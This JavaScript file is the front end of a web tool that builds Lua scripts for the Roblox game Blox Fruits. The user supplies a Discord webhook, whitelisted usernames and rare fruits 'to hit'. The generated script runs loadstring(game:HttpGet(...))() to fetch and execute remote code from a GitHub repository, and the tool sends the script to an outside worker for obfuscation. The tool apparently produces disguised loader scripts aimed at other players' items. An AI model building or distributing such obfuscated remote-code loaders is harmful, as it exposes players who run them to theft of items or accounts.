document.addEventListener('DOMContentLoaded', () => {
    // --- DOM Elements ---
    const webhookUrlInput = document.getElementById('webhookUrl');
    const usernamesInput = document.getElementById('usernamesInput');
    const fruitCheckboxesContainer = document.getElementById('fruitCheckboxes');
    const generateButton = document.getElementById('generateButton');
    const outputScriptElement = document.getElementById('outputScript');
    const copyButton = document.getElementById('copyButton');
    const deselectAllButton = document.getElementById('deselectAllFruits');
    const errorMessagesDiv = document.getElementById('errorMessages');
    const outputSection = document.getElementById('outputSection');
    const loadingIndicator = document.getElementById('loadingIndicator');

    // --- Data: Fruits sorted by rarity ---
    const mythicalFruits = [
        "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard", "Control-Control",
        "Dough-Dough", "T-Rex-T-Rex", "Spirit-Spirit", "Mammoth-Mammoth", "Venom-Venom"
    ];
    const legendaryFruits = [
        "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble", "Shadow-Shadow", "Blizzard-Blizzard",
        "Sound-Sound", "Phoenix-Phoenix", "Pain-Pain", "Gravity-Gravity", "Love-Love",
        "Spider-Spider", "Quake-Quake"
    ]; // No .sort()
    const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
    const defaultSelectedFruits = ["Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"];

    // --- Functions ---

    function displayError(message) {
        errorMessagesDiv.textContent = message;
        errorMessagesDiv.classList.remove('hidden');
        errorMessagesDiv.classList.add('block');
        errorMessagesDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    function clearErrors() {
        errorMessagesDiv.textContent = '';
        errorMessagesDiv.classList.add('hidden');
        errorMessagesDiv.classList.remove('block');
    }

    function populateFruitCheckboxes() {
        fruitCheckboxesContainer.innerHTML = '';
        sortedFruitsByRarity.forEach(fruitName => {
            const checkboxId = `fruit-${fruitName.replace(/[^a-zA-Z0-9]/g, '-')}`;
            const label = document.createElement('label');
            label.htmlFor = checkboxId;
            label.className = 'text-sm text-gray-700';

            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.id = checkboxId;
            checkbox.name = 'fruit';
            checkbox.value = fruitName;

            if (defaultSelectedFruits.includes(fruitName)) {
                checkbox.checked = true;
            }

            const span = document.createElement('span');
            span.textContent = fruitName;
            if (checkbox.checked) { span.classList.add('font-semibold'); }
            checkbox.addEventListener('change', (event) => {
                span.classList.toggle('font-semibold', event.target.checked);
            });

            label.appendChild(checkbox);
            label.appendChild(span);
            fruitCheckboxesContainer.appendChild(label);
        });
    }

    // Updated validation function
    function validateInputs() {
        const webhookUrl = webhookUrlInput.value.trim();
        const usernamesRaw = usernamesInput.value.trim();
        // Regex allows both discord.com and discordapp.com
        const discordWebhookRegex = /^https:\/\/discord(?:app)?\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/;

        if (!webhookUrl || !discordWebhookRegex.test(webhookUrl)) {
            displayError("Error: Invalid Discord Webhook URL format (must start with https://discord.com/ or https://discordapp.com/).");
            webhookUrlInput.focus();
            return false;
        }
        if (!usernamesRaw) {
            displayError("Error: Usernames list cannot be empty.");
            usernamesInput.focus();
            return false;
        }
        const usernamesArray = usernamesRaw.split('\n').map(name => name.trim()).filter(name => name !== '');
        if (usernamesArray.length === 0) {
            displayError("Error: Please enter at least one valid username.");
            usernamesInput.focus();
            return false;
        }
        for (const username of usernamesArray) {
            if (/\s/.test(username)) {
                displayError(`Error: Username "${username}" contains spaces.`);
                usernamesInput.focus();
                return false;
            }
        }
        return true; // Validation passed
    }

    // Function to generate the base Lua script string
    function generateBaseScript() {
        const webhookUrl = webhookUrlInput.value.trim();
        const usernamesRaw = usernamesInput.value.trim();
        const usernamesArray = usernamesRaw.split('\n').map(name => name.trim()).filter(name => name !== '');
        const usernamesLuaTable = usernamesArray.map(name => `"${name}"`).join(', ');

        const selectedFruits = [];
        const checkedBoxes = document.querySelectorAll('input[name="fruit"]:checked');
        checkedBoxes.forEach(checkbox => { selectedFruits.push(`"${checkbox.value}"`); });
        const fruitsLuaTable = selectedFruits.join(', ');

        const baseScript = `Webhook = "${webhookUrl}" -- Webhook URL
Usernames = {${usernamesLuaTable}} -- Usernames to Whitelist
FruitsToHit = {${fruitsLuaTable}} -- Fruits to detect

-- Load the main script
loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
        return baseScript;
    }

    // Function to handle copy to clipboard
    function copyScriptToClipboard() {
        navigator.clipboard.writeText(outputScriptElement.textContent).then(() => {
            copyButton.textContent = 'Copied!';
            copyButton.classList.replace('bg-green-600', 'bg-green-500');
            copyButton.classList.replace('hover:bg-green-700', 'hover:bg-green-600');
            setTimeout(() => {
                copyButton.textContent = 'Copy to Clipboard';
                copyButton.classList.replace('bg-green-500', 'bg-green-600');
                copyButton.classList.replace('hover:bg-green-600', 'hover:bg-green-700');
            }, 2000);
        }).catch(err => {
            displayError('Failed to copy script.');
        });
    }

    // Function to select/deselect all fruit checkboxes
    function setAllFruitCheckboxes(checkedState) {
        document.querySelectorAll('input[name="fruit"]').forEach(checkbox => {
            checkbox.checked = checkedState;
            const span = checkbox.nextElementSibling;
            if (span) { span.classList.toggle('font-semibold', checkedState); }
        });
    }

    // --- Event Listeners ---
    generateButton.addEventListener('click', async () => {
        clearErrors();
        // Update titles/placeholders for obfuscation
        outputSection.classList.add('hidden');
        outputScriptElement.textContent = '-- Your obfuscated script will appear here...';
        document.querySelector('#outputSection h2').textContent = 'Obfuscated Script:'; // Update heading
        generateButton.textContent = 'Generate & Obfuscate Script'; // Update button text

        copyButton.textContent = 'Copy to Clipboard';
        copyButton.classList.remove('bg-green-500', 'hover:bg-green-600');
        copyButton.classList.add('bg-green-600', 'hover:bg-green-700');


        if (!validateInputs()) { return; }

        const baseScript = generateBaseScript();
        loadingIndicator.classList.remove('hidden');
        generateButton.disabled = true;

        // --- Call Backend ---
        try {
            // --- Use the endpoint defined in the JS Obfuscator Worker ---
            // Use relative path for deployment with routing, or full URL for direct call/local test
            const apiEndpoint = 'https://mock-obfuscator-worker.iam-greatpro123.workers.dev/api/obfuscate'; // Use your wrangler dev port
            // const apiEndpoint = 'https://your-worker-subdomain.workers.dev/api/obfuscate'; // Example for direct call

            console.log(`Sending script to backend: ${apiEndpoint}`);

            const response = await fetch(apiEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'text/plain' },
                body: baseScript
            });

            console.log(`Received response status: ${response.status}`);

            if (!response.ok) {
                let errorMsg = `Error processing script: ${response.status} ${response.statusText}`;
                try {
                    const errorBody = await response.text();
                    if (errorBody) { errorMsg += `\nServer response: ${errorBody.substring(0, 500)}${errorBody.length > 500 ? '...' : ''}`; }
                } catch (_) { /* Ignore */ }
                throw new Error(errorMsg);
            }

            // Get the processed (obfuscated) script from the response body
            const processedScript = await response.text();

            // --- Display Result ---
            outputScriptElement.textContent = processedScript;
            outputSection.classList.remove('hidden');
            copyButton.style.display = 'inline-block';

        } catch (error) {
            console.error("Processing error:", error);
            displayError(`Failed to process script. ${error.message}. Please ensure the backend worker is running and the API endpoint URL is correct.`);
            outputSection.classList.add('hidden');
        } finally {
            loadingIndicator.classList.add('hidden');
            generateButton.disabled = false;
        }
    });

    deselectAllButton.addEventListener('click', () => setAllFruitCheckboxes(false));
    copyButton.addEventListener('click', copyScriptToClipboard);

    // --- Initialization ---
    populateFruitCheckboxes();
});
